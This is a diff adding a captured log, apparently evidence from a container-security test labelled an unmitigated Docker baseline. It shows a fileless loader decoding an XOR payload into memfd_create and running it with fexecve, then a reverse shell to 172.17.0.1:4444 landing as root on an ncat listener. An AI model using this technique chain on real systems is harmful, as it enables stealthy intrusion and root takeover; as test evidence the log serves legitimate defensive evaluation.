@@ -1,0 +1,26 @@
+# Proof 1A — Docker Control Baseline: Attack Success (Unmitigated)
+# Captured: Sat Jun 27 06:12:14 AM CDT 2026 | Kernel: 6.12.74+deb13+1-amd64
+# ------------------------------------------------------------
+
+--- LOADER OUTPUT ---
+[LOADER] ============================================================
+[LOADER] Fileless Loader
+[LOADER] Technique : memfd_create + fexecve (T1027.002)
+[LOADER] Payload   : 961928 bytes (XOR-encoded, key=0xAB)
+[LOADER] ============================================================
+[LOADER] Step 1: XOR decode  ... OK (961928 bytes)
+[LOADER] Step 2: memfd_create ... OK (fd=3, /proc/self/fd/3 -> /memfd: )
+[LOADER] Step 3: write payload ... OK (961928 bytes to fd)
+[LOADER] Step 3b: memfd sealed (F_SEAL_WRITE|SHRINK|GROW|SEAL) ... OK
+[LOADER] Step 4: fexecve     ... calling (no return on success)
+[PAYLOAD] Exfil proof file: /tmp/containment_leak_PROOF.txt
+[PAYLOAD] --- Initiating reverse shell to 172.17.0.1:4444 ---
+[PAYLOAD] Connected to 172.17.0.1:4444 — redirecting stdio & spawning shell
+
+--- C2 LISTENER OUTPUT ---
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2:42450.
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+root
